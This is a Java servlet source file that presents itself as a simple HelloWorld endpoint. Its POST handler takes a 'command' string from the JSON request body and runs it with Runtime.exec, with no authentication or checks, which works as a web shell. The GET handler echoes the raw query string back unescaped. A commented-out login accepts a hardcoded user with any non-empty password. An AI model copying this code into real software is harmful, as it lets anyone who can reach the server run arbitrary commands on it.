package servlet;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.json.JSONException;
import org.json.JSONObject;

@WebServlet(urlPatterns = {"/services/helloworld", "/helloworld"})
public class HelloWorld extends HttpServlet {
	private static final long serialVersionUID = 1L;

    public HelloWorld() {
    	System.out.println("helloworld");
    }

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

		ServletUtil.utf8Encoding(request, response);
		
		PrintWriter out = response.getWriter();
		String requestURL = request.getRequestURL().toString();
		String serverName = request.getServerName();
		String contextPath = request.getContextPath();
		String servletPath = request.getServletPath();
		String queryString = request.getQueryString();
		System.out.println("requestURL = " + requestURL);
		System.out.println("serverName = " + serverName);
		System.out.println("contextPath = " + contextPath);
		System.out.println("servletPath = " + servletPath);
		System.out.println("queryString = " + queryString);
		System.out.println("Method = " + request.getMethod());
		
		try {
			//JSONObject output = new JSONObject();
			//output.put("url", request.getServletPath());
			//output.put("str", "Hello World");
			if(queryString == null)
				out.print("Hello_World");
			else
				out.print("Hello_World?" + queryString);
			
			out.flush();
			out.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		/*
		HttpSession session = request.getSession();
		String userName = request.getParameter("userName");
		String userPassword = request.getParameter("userPassword");
		UserMessage userMessage = new UserMessage();
		userMessage.setUserName(userName);
		userMessage.setUserPassword(userPassword);
		request.setAttribute("userMessage", userMessage);
		String loginMessage = "login fail";
		if(userName.equals("welson") && !userPassword.equals("")) {
			loginMessage = "login ok";
		}
		session.setAttribute("loginMessage", loginMessage);
		request.getRequestDispatcher("/loginMessage.jsp").forward(request, response);
		*/
		
		ServletUtil.utf8Encoding(request, response);
		
		JSONObject output = new JSONObject();
		PrintWriter out = response.getWriter();

		try {
			String reqBody = ServletUtil.getServletRequestBody(request);
			JSONObject req = new JSONObject(reqBody);
			
			String[] cmd = req.getString("command").split(" ");
			for(String s : cmd)
				System.out.println("command:" + s);
			Runtime.getRuntime().exec(cmd);
			
			output.put("data", req.toString());
		} catch (JSONException e) {
			e.printStackTrace();
		} 
		
		out.print(output);
		//out.write(output.toString());
		out.flush();
		out.close();
	}
}
